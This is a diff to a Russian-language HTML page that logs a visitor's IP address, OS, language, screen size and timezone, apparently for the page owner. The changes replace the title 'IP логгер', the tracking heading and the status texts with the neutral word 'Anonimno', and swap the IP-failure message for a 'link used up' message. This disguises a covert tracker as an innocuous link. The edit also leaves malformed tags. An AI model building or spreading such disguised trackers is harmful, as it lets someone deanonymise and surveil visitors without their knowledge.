@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>IP логгер</title>
+    <title>Anonimno</title>
     <style>
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
@@ -55,16 +55,16 @@
 </head>
 <body>
 <div class="container">
-    <h2>📡 Отслеживание визита</h2>
+    <h2<Anonimno/h2>
     <p style="color:#ddd; text-align:center;">Ваши данные будут отправлены на почту владельцу</p>
 
     <div class="info-box" id="info">
-        ⏳ Сбор информации...
+        Anonimno
     </div>
 
     <div class="status" id="status"></div>
     <div class="note">
-        🔒 Адрес и данные отправляются через защищённое соединение
+        Anonimno
     </div>
 </div>
 
@@ -78,7 +78,7 @@
             const data = await response.json();
             return data.ip;
         } catch (e) {
-            return 'Не удалось определить IP';
+            return 'ссылка истрачена';
         }
     }
 
@@ -106,8 +106,7 @@
             📱 ОС: ${browserInfo.platform}<br>
             🌍 Язык: ${browserInfo.language}<br>
             📏 Экран: ${browserInfo.screenSize}<br>
-            ⏰ Часовой пояс: ${browserInfo.timezone}<br>
-            🔗 Источник: ${browserInfo.referrer}
+            ⏰ Часовой пояс: ${browserInfo.timezone}<
         `;
     }
 
